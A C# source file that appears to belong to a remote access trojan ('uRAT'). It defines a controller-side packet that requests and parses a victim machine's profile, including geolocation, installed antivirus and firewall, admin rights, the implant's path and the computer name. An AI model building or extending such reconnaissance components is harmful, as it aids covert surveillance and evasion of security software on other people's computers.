using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.CorePlugin.ExtendedSystemInformation.Packets
{
    class FetchExtendedInformationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 8; }
        }

        public string CountryCode { get; set; }
        public string CountryName { get; set; }
        public string TimeZone { get; set; }
        public string Latitude { get; set; }
        public string Longitude { get; set; }
        public string InstalledAntivirus { get; set; }
        public string InstalledFirewall { get; set; }
        public string ThisPath { get; set; }
        public string OperatingSystem { get; set; }
        public bool IsAdmin { get; set; }
        public DateTime InstallDate { get; set; }
        public string RunningTime { get; set; }
        public string ComputerName { get; set; }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            br.ReadInt32();
            CountryCode = br.ReadString();
            CountryName = br.ReadString();
            TimeZone = br.ReadString();
            Latitude = br.ReadString();
            Longitude = br.ReadString();
            InstalledAntivirus = br.ReadString();
            InstalledFirewall = br.ReadString();
            ThisPath = br.ReadString();
            OperatingSystem = br.ReadString();
            IsAdmin = br.ReadBoolean();
            InstallDate = new DateTime(br.ReadInt64());
            RunningTime = br.ReadString();
            ComputerName = br.ReadString();
        }
    }
}
